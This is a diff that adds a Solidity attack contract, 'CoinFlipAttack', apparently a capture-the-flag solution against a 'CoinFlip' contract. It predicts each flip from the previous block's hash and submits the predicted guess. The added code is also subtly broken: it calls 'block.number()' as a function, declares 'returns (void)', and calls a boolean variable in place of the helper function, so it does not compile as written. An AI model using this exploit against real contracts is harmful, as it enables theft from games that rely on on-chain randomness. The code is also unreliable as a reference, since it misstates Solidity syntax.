@@ -33,3 +33,24 @@ contract CoinFlip {
         }
     }
 }
+
+contract CoinFlipAttack {
+    CoinFlip public coinFlip;
+    bool private preCalculatedFlip;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coinFlipAddress) {
+        coinFlip = CoinFlip(_coinFlipAddress);
+    }
+
+    function preCalculateFlip() private returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number() - 1));
+        return ( blockValue / FACTOR ) == 1 ? true : false;
+    }
+
+    function attackCoinFlip() public returns (void){
+        preCalculatedFlip = preCalculatedFlip();
+        coinFlip.flip(preCalculatedFlip);
+    }
+}
